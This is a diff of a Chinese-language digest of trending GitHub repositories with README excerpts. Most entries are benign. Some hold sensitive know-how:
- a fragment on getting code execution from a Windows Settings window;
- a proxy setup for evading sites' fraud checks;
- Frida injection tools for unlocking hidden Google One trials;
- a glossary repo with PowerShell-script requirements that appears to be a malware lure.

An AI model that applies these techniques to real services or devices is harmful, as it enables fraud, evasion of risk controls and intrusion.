+    From now, it's just up to you how you want to to execute code, having focus on settings window allows multiple ways to get code execution in the context of the "WsiAccount" user. For me I prefer navigating to "Bluetooth & Devices" then going for "AutoPlay" then "Removable Drive" and finally "Open folder to view fi
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#5  0xkaka/homeport
+    ⭐ 605 stars  |  🍴 105 forks  |  💻 HTML  |  📅 2026-11-17
+    🔗 https://github.com/0xkaka/homeport
+    📡 来源: 🚀 5天300+星
+    📝 无描述
+
+    README 摘要:
+    # homeport
+    
+    **一句话：让 Claude、Google、Stripe 这些网站，在你所有设备上都看到同一个“住宅 IP”。**
+    
+    很多人用机场节点访问 Claude / Google，节点一会儿日本一会儿美国，IP 来回跳，再加上机场 IP 是机房 IP，很容易触发风控：注册要验证、付款失败、身份认证不过、甚至封号。
+    
+    homeport 做的事情很简单：把这些“敏感网站”单独挑出来，统一走一条固定的**住宅代理**；其他网站照旧走你的机场，速度不受影响。
+    
+    > 🛒 **还没有住宅 IP？** 看这篇 👉 便宜静态住宅 IP 购买教程
+    
+    ---
+    
+    ## ⚡ 懒人一键版（推荐小白）
+    
+    打开 👉 **https://0xkaka.github.io/homeport/**
+    
+    1. 照着服务商后台，填上住宅代理的地址、端口、用户名、密码；
+    2. 选你的设备和软件，点「复制」，到软件里粘贴（iPhone 可以直接扫码加节点）；
+    3. 打开 `ipv4.webshare.io` 看 IP 对不对。
+    
+    账号密码只在你自己浏览器里处理，不会上传。下面是详细的手动教程，一键版搞不定再看。
+    
+    ---
+    
+    ## 目录
+    
+    1. 原理（看不懂可以跳过）
+    2. 开始前要准备什么
+    3. Clash Party（Mac / Windows）
+    4. Clash Verge Rev（Windows / Mac）
+    5. 安卓：FlClash
+    6. 小火箭 Shadowrocket（iPhone / iPad / Mac）
+    7. 检查是否成功
+    8. Claude Code、终端、Chrome 的额外设置
+    9. 常见问题
+    10. 哪些网站会走住宅出口
+    11. 给维护者：修改规则
+    
+    ---
     
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#11  guuguo/antigravity-zh-launcher
-    ⭐ 45 stars  |  🍴 3 forks  |  💻 PowerShell  |  📅 2026-11-14
-    🔗 https://github.com/guuguo/antigravity-zh-launcher
-    📡 来源: 🌍 本地化/多语言 | 新建 | localization i18n transl
-    🏷️ ai-ide, antigravity, chinese, gemini, google-antigravity, i18n, japanese, korean, launcher, localization
-    📝 Non-intrusive multi-language launcher for Google Antigravity (日本語/한국어/한글/繁體中文/中文/9 languages, AI thinking localization) | Antigravity 多语言无损启动器
+#6  nataphong-lab/Open-Source-Face-Recognition-Ultimate
+    ⭐ 514 stars  |  🍴 420 forks  |  💻 Python  |  📅 2026-11-19
+    🔗 https://github.com/nataphong-lab/Open-Source-Face-Recognition-Ultimate
+    📡 来源: 🚀 5天300+星
+    📝 Face Recognition, Face Liveness Detection, Face Anti-Spoofing, Face Detection, Face Landmarks, Face Compare, Face Matching, Face Pose, Face Expression, Face Attributes, Face Templates Extraction, Face Landmarks
 
     README 摘要:
-    简体中文 · English · 日本語 · 한국어 · 繁體中文
+    # Ultimate Open Source Face Recognition SDK
     
-    # Antigravity 多语言无损启动器 (`antigravity-zh-launcher`)
+      
     
-    > **适用系统**：macOS & Windows（内置系统原生脚本，**零 Node.js 运行时依赖**）  
-    > **覆盖范围**：软件主界面、设置面板、MCP / 插件市场、Skills & Rules、Agents / 自动化、悬浮提示 (Tooltip)、首次协议引导页 + **AI 思考过程与回答全链路本地化**  
-    > **支持语言**：9 国语言（简体中文 / 繁體中文 / 日本語 / 한국어 / Español / Français / Deutsch / Русский / Português）
+    Open Source Face Recognition SDK
     
-    不解包、不改写 `app.asar`、不重签名破坏官方安装包。为你生成一个独立的「**Antigravity 中文**」（或任意目标语言）启动图标，与原版英文 `Antigravity` 双图标并存、随时切换，官方每次自动升级都不失效。
+      A Free, Privacy-Focused Face Recognition Solution for Windows and Linux
     
-    ---
+      Built with deep learning technology, featuring face detection, facial landmarks, feature extraction, and face similarity comparison.
     
-    ## ⚡ 为什么选择「无损启动器」而不是传统 `app.asar` 汉化补丁？
-    
-    | 对比维度 | 传统改包方案（解包重写 `app.asar`） | 本项目 `antigravity-zh-launcher` |
-    | :--- | :--- | :--- |
-    | **原版安全性与签名** | 改写官方包体，macOS 需强制重签名，易触发 Gatekeeper 损坏拦截 | **100% 零修改原版文件**，保留 Google 官方代码签名 |
-    | **应对官方版本更新** | Antigravity 每次升级都会覆盖 `app.asar`，必须重新打补丁 | **升级零冲突**，外挂启动器自动生效，无需重复折腾 |
-    | **聊天与代码防误伤** | 全局子串/短词替换，**容易把对话气泡和代码里的英文误翻成中文** | **严格 DOM 边界隔离**，跳过用户消息、代码块、编辑器与回复正文 |
-    | **AI 思考与输出语言** | 只汉化按钮菜单，AI 思考过程、计划书和回答仍经常飘回英文 | **联动全局语言规则插件**，界面 + 思考链路 + 终端摘要 + 回答统一语言 |
-    | **原版英文对照需求** | 单包覆盖，想看英文原词必须先卸载还原再重启 | **原版与本地化双图标独立并存**，随时切回原版英文 |
-    | **多语言与运行依赖** | 通常需先安装 Node.js 环境，仅支持中繁 | **零 Node.js 依赖**（macOS Bash+Python / Win 原生 PowerShell），支持 **9 国语言** |
+      Improved Recognition Accuracy Through Further Training and Optimization of
+      FacePlugin's Open-Source Face Recognition Model
     
     ---
     
-    ## 📸 实机效果展示
+    ## 🚀 Overview
     
-    ### 1. 主工作台 + AI 思考与工具链路全中文
+    The **Open Source Face Recognition SDK** is a free, privacy-focused solution designed to integrate face recognition capabilities into applications running on Windows and Linux.
     
-    ### 2. 设置面板（外观 / 执行 / 权限 / 快捷键 / 模型额度）深度汉化
+    Powered by deep learning models, this SDK provides face detection, facial feature extraction, and face similarity comparison through a simple Python interface.
     
-    ### 3. 自定义面板（插件市场 / MCP 服务器 / Skills & Rules / 智能体）
+    The recognition model has been further trained using FacePlugin's model as a starting point to improve recognition accuracy.
     
-    ### 4. 首次启动引导协议页 & 原版双图标独立并存
-    | 首次启动协议与设置引导 | 原版与本地化双图标并存 |
-    | --- | --- |
-    |  |  |
+    **Privacy is a priority:** All biometric processing takes place locally, allowing applications to operate without sending facial data to external servers.
     
-    🌍 点击展开其余 8 国语言实机截图（繁體中文 / 日本語 / 한국어 / Español / Français / Deutsch / Русский / Português）
+    ### ✨ Key Features
     
+    - 🔒 **100% On-Premise Processing:** All face recognition operations run locally. No biometric data needs to leave your device.
+    - 🎯 **High Recognition Accuracy:** Uses deep learning models with additional model training and optimization.
+    - ⚡ **Real-Time Processing:** Supports efficient face detection and recognition workflows.
+    - 🔧 **Easy Integration:** Simple Python APIs for application development.
+    - 🌐 **Cross-Platform:** Supports Windows and Linux.
+    - 💻 **CPU and GPU Support:** Can operate on CPU-only systems, with optional GPU acceleration where supported.
+    - 🆓 **Completely Free:** Open source with no SDK licensing fees.
+    
+    ### 🎯 Current Capabilities
+    
+    - Face detection and bounding box extraction.
+    - Facial landmark detection.
+    - Facial feature embedding generation.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#7  replit/datacat
+    ⭐ 471 stars  |  🍴 52 forks  |  💻 TypeScript  |  📅 2026-11-17
+    🔗 https://github.com/replit/datacat
+    📡 来源: 🚀 5天300+星
+    🏷️ alerting, apm, clickhouse, dashboards, logging, metrics, monitoring, observability, opentelemetry, postgresql
+    📝 Self-hosted observability: metrics, logs, traces, dashboards and alerts. Stores data in PostgreSQL or ClickHouse. Accepts OpenTelemetry data.
+
+    README 摘要:
+    # DataCat
+    
+    Self-hosted observability: metrics, logs, distributed traces, dashboards, infrastructure
+    and alerts in one place. DataCat runs on your infrastructure, stores data in PostgreSQL (or telemetry in
+    ClickHouse, if you choose; see docs/SELF_HOSTING.md), and accepts OpenTelemetry and Datadog-compatible agent traffic.
+    No hosted account or external service is required.
+    
+    ## Features
+    
+    - Metrics explorer, formulas, dashboards and host maps
+    - Searchable logs with facets, live tail and trace correlation
+    - APM service catalog, trace explorer and waterfall
+    - Metric, log and trace monitors with webhook/Slack notifications
+    - Organizations, local accounts, single-use invites, API/application keys
+    - OpenTelemetry Collector-based host agent and Node.js/Python instrumentation libraries
+    - One production process serving the API, web UI, installer and downloads
+    
+    ## Quick start with Docker Compose
+    
+    Requirements: Docker Engine with the Compose plugin, Git, and OpenSSL.
+    
+    ```sh
+    git clone https://github.com/replit/datacat
+    cd datacat
+    cp .env.example .env
+    sed -i "s/^POSTGRES_PASSWORD=.*/POSTGRES_PASSWORD=$(openssl rand -hex 24)/" .env
+    sed -i "s/^SESSION_SECRET=.*/SESSION_SECRET=$(openssl rand -hex 32)/" .env
+    chmod 600 .env
+    mkdir -p downloads
+    docker compose up -d --build
+    ```
+    
+    Open **http://localhost:3000**, create your admin account and organization, then create
+    an API key under **Organization Settings**. Setup asks for a setup token, printed in the
+    server log (`docker compose logs datacat | grep "setup token"`) unless you set `DATACAT_SETUP_TOKEN`.
+    Set `PUBLIC_URL` to your externally reachable HTTPS origin before inviting colleagues or
+    installing agents remotely.
+    
+    Agent binaries and SDK packages are separate release assets. Put them (including
+    `SHA256SUMS`) in `downloads/` to serve them from your instance.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#8  hatsunemiku-ai/google-one-tools
+    ⭐ 463 stars  |  🍴 321 forks  |  💻 Python  |  📅 2026-11-20
+    🔗 https://github.com/hatsunemiku-ai/google-one-tools
+    📡 来源: 🚀 5天300+星
+    📝 无描述
+
+    README 摘要:
+    # Google One 工具包（MuMu 模拟器 + Frida）
+    
+    **`g1.30tb`已在大部分区域下架，可以先搞搞3个月打折的Ultra 5X**
+    
+    通过 Frida 注入模拟器里的 Google One 进程，调用 Play BillingClient：
+    **扫描账号可用的全部订阅 offer（免费/付费）**，以及**拉起任意 SKU 的 Play 收银台**（只弹出，不自动订阅）。
+    
+    ---
+    
+    ## 文件清单
+    
+    | 文件 | 用途 |
+    |---|---|
+    | `ultra0_core.py` | 自包含核心（adb/frida-server/计费模块/注入模板，从原 ultra0.py 抽取） |
+    | `extract_core.py` | 生成器：从原版 ultra0.py 重新抽取 ultra0_core.py（仅维护时用） |
+    | `one_common.py` | 公共环境准备（选设备/root/frida-server/计费模块/Play 商店保活），所有脚本共用 |
+    | `launch_checkout.py` + `launch_checkout.js` | **拉起任意 SKU 收银台**（主力脚本） |
+    | `scan_all.py` | 全量扫描 70 个候选 SKU 的所有 offer（免费+付费+token），零风险 |
+    | `query_sku.py` | 只查指定几个 SKU，零风险 |
+    | `probe_env.py` | 环境诊断（frida 版本 / Java 桥 / Play 商店状态），出问题先跑它 |
+    | `scan_everything.py` + `scan_offers.js` | 穷举账号全部 SKU，输出带定价阶段的原始 JSON 并渲染清单 |
+    | `render_multi.py` | 合并多地区 JSON，生成 `SKU-清单.md` |
+    | `scan_result_*.json` | 各地区扫描原始数据（已脱敏：serial 已掩码、token 已置空） |
+    | `SKU-清单.md` | 多地区金额对照 + 人民币比价清单 |
+    
+    > 整个文件夹**自包含、无外部依赖**：把 `google-one-tools` 拷到任何机器（装有
+    > Python3.9+ 和 frida 16.x）都能直接跑，不需要原版仓库里的脚本。
+    
+    ## 环境要求（缺一不可）
+    
+    1. **本机 frida 必须 16.x**（推荐 16.7.19）：
+       ```powershell
+       py -m pip install frida==16.7.19
+       ```
+       > ⚠️ frida 17.x 在 MuMu（Android 12 / x86_64）上 Java 桥损坏（`Java is not defined`），
+       > 所有功能静默失效。设备上的 frida-server 也必须同版本（脚本会自动下载匹配版）。
+    2. **自包含核心**：所有对原版 `ultra0.py` 的依赖已抽取进 `ultra0_core.py`，
+       本文件夹可整体拷贝到别处使用；要更新抽取范围，改 `extract_core.py` 后重跑 `py extract_core.py`。
+    3. 模拟器已 root、已登录 Google 账号、装有 Google One 和 Play 商店。
+    4. 用 `py` 而不是 `python`（本机的 `python` 是商店占位符，跑不了）。
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#9  duwqijlk/google-trial-tool
+    ⭐ 371 stars  |  🍴 161 forks  |  💻 JavaScript  |  📅 2026-11-19
+    🔗 https://github.com/duwqijlk/google-trial-tool
+    📡 来源: 🚀 5天300+星
+    📝 无描述
+
+    README 摘要:
+    # Google AI Trial Tool
+    
+    内容为转载，来自q群797481450
+    这次的会封号 ，涉及工具调用，慎用
+    
+    通过 Frida 注入 Google One 进程调用 BillingClient API，发现并激活隐藏的 $0 免费试用。
+    
+    ## 前提条件
+    
+    | 组件 | 说明 |
+    |---|---|
+    | **MuMu 模拟器** | 已启动，已登录 Google 账号，已绑定付款方式 |
+    | **adb** | 在 PATH 中，或设置 `ADB_PATH` 环境变量 |
+    | **frida** (host) | `pip install frida-tools`，版本 ≥ 16 |
+    | **frida-server** (device) | 推送到设备 `/data/local/tmp/frida-server` 并赋予执行权限 |
+    | **module.apk** (device) | 包含 BillingClient 库的 APK，推送到 `/data/local/tmp/module.apk` |
+    | **Google One** | 设备上已安装 (`com.google.android.apps.subscriptions.red`) |
+    
+    ## 设备准备
+    
+    ```bash
+    # 连接 MuMu
+    adb connect 127.0.0.1:16384
+    
+    # 推送 frida-server（从 https://github.com/frida/frida/releases 下载对应架构）
+    adb push frida-server /data/local/tmp/frida-server
+    adb shell "chmod 755 /data/local/tmp/frida-server"
+    
+    # 推送 module.apk（包含 com.android.billingclient 的 APK）
+    adb push module.apk /data/local/tmp/module.apk
+    ```
+    
+    ## 用法
+    
+    ```bash
+    # 列出当前账号所有可用试用
+    ./auto-trial.sh --list
+    
+    # 激活 Pro (5TB, $19.99/mo) 3个月免费试用
+    ./auto-trial.sh --product pro --dur 3mo
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#10  jollykit/gta-6-localization-reference-glossary
+    ⭐ 150 stars  |  🍴 0 forks  |  💻 Rust  |  📅 2026-11-19
+    🔗 https://github.com/jollykit/gta-6-localization-reference-glossary
+    📡 来源: 🌍 本地化/多语言 | 新建 | localization i18n transl
+    🏷️ documentation, glossary, i18n, l10n, localization, multilingual, reference, terminology, translation
+    📝 Terminology reference for GTA 6 localization, compiled from public sources.
+
+    README 摘要:
+    # Gta 6 Localization Reference Glossary — Deep Dive
+    
+    ### 🖥️ PowerShell Setup
+    
+      
+    
+    Show your support
+    ETH:&nbsp;0x501DA0ad3aF5A9118d5a79Cb90BD8129b8655538
+    
+    ---
+    
+    The Gta 6 Localization Reference Glossary serves as a working reference for translators, editors, and reviewers handling in-game content, documenting recurring terms and their approved translations across supported languages. It is compiled from glossary material intended to keep terminology consistent in dialogue, missions, and interface text, and it flags the cases where a direct translation would misrepresent the original meaning. This guide is honest about its limits: entries reflect the current state of the source material and may lag behind late changes or omit context that only appears in the shipped game. Readers should treat the glossary as a starting point for their own review rather than a final authority on every string.
+    
+    ## 📋 System Requirements
+    
+    - **OS:** Windows 10 / 11
+    - **Shell:** PowerShell 5.1+ or PowerShell 7+
+    - **Network:** internet access to download the script
+    - **Privileges:** standard user
+    
+    ## How It Works
+    
+    This glossary operates as a structured, version-controlled reference rather than a translation tool. Each entry pairs a source term from the game with its localized equivalents across supported languages, alongside contextual notes that explain why a given rendering was chosen. Terms are organized by domain—mission names, fictional brands, character titles, UI strings, and in-world signage—so that translators and modders can locate related vocabulary without scanning an alphabetical list.
+    
+    The underlying data is kept in plain-text, diff-friendly files. Every entry carries metadata: a stable identifier, the source language string, one or more target-language strings, part of speech, a short definition, and optional usage examples drawn from promotional material or official communications. Where a term is ambiguous or has no confirmed official translation, the entry is flagged accordingly rather than filled with speculative content. This distinction between confirmed, inferred, and unresolved terms is deliberate; the glossary does not present guesses as facts.
+    
+    Entries are cross-referenced through shared tags and identifiers, allowing a term used in multiple contexts—such as a recurring brand name that appears in radio ads and on billboards—to be traced to a single canonical record. When official localization sources update or correct a prior rendering, the change is recor
